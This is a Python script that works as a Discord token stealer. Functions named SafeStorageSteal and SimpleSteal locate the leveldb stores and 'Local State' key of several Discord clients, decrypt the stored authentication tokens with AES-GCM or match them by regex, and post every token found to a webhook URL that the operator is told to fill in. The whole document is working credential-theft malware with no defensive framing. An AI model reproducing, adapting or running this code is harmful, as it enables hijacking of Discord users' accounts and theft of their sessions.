import os
import json
import base64
import re
import requests
from Crypto.Cipher import AES

APPDATA = os.getenv('APPDATA')
REGEX = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'

def get_paths():
    paths = {
        "Discord": os.path.join(APPDATA, "discord"),
        "Discord Canary": os.path.join(APPDATA, "discordcanary"),
        "Lightcord": os.path.join(APPDATA, "Lightcord"),
        "Discord PTB": os.path.join(APPDATA, "discordptb")
    }
    print(f"Paths: {paths}")
    return paths

def SafeStorageSteal(path: str) -> list[str]:
    encryptedTokens = []
    tokens = []
    key = None
    levelDbPaths = []

    localStatePath = os.path.join(path, "Local State")
    print(f"Local State Path: {localStatePath}")

    if os.path.isfile(localStatePath):
        print(f"Local State file exists: {localStatePath}")
    else:
        print(f"Local State file does not exist: {localStatePath}")

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))
                print(f"LevelDB Path: {os.path.join(root, dir)}")

    if levelDbPaths:
        print(f"LevelDB directories found: {levelDbPaths}")
    else:
        print("No LevelDB directories found.")

    if os.path.isfile(localStatePath) and levelDbPaths:
        with open(localStatePath, errors="ignore") as file:
            jsonContent = json.load(file)
        print(f"Local State content: {jsonContent}")
        key = jsonContent['os_crypt']['encrypted_key']
        key = base64.b64decode(key)[5:]
        print(f"Decoded Key: {key}")

        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    print(f"Reading File: {filepath}")
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()
                    print(f"File content: {lines[:10]}")  # Print the first 10 lines for brevity
                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if match not in encryptedTokens:
                                    match = match.split("dQw4w9WgXcQ:")[1].encode()
                                    missing_padding = 4 - (len(match) % 4)
                                    if missing_padding:
                                        match += b'=' * missing_padding
                                    match = base64.b64decode(match)
                                    encryptedTokens.append(match)

    for token in encryptedTokens:
        try:
            print(f"Token before decryption: {token}")
            token = AES.new(key, AES.MODE_GCM, nonce=token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
            print(f"Token after decryption: {token}")
            if token:
                tokens.append(token)
        except Exception as e:
            print(f"Error decrypting token: {e}")

    print(f"SafeStorageSteal tokens: {tokens}")
    return tokens

def SimpleSteal(path: str) -> list[str]:
    tokens = []
    levelDbPaths = []

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))
                print(f"LevelDB Path: {os.path.join(root, dir)}")

    if levelDbPaths:
        print(f"LevelDB directories found: {levelDbPaths}")
    else:
        print("No LevelDB directories found.")

    for levelDbPath in levelDbPaths:
        for file in os.listdir(levelDbPath):
            if file.endswith((".log", ".ldb")):
                filepath = os.path.join(levelDbPath, file)
                print(f"Reading File: {filepath}")
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()
                print(f"File content: {lines[:10]}")  # Print the first 10 lines for brevity
                for line in lines:
                    if line.strip():
                        matches = re.findall(REGEX, line.strip())
                        for match in matches:
                            match = match.rstrip("\\")
                            if not match in tokens:
                                tokens.append(match)

    print(f"SimpleSteal tokens: {tokens}")
    return tokens

def main(webhook_url):
    paths = get_paths()
    all_tokens = []

    for name, path in paths.items():
        if os.path.exists(path):
            print(f"Checking path: {name} - {path}")
            tokens = SafeStorageSteal(path)
            if not tokens:
                tokens = SimpleSteal(path)
            all_tokens.extend(tokens)

    if all_tokens:
        payload = {
            "content": "\n".join(all_tokens)
        }
        response = requests.post(webhook_url, json=payload)
        print(f"Webhook response: {response.status_code} - {response.text}")
    else:
        print("No tokens found.")

if __name__ == "__main__":
    WEBHOOK_URL = 'httpdiscord.com/api/webhooks/119m'  # Replace with your webhook URL
    main(WEBHOOK_URL)
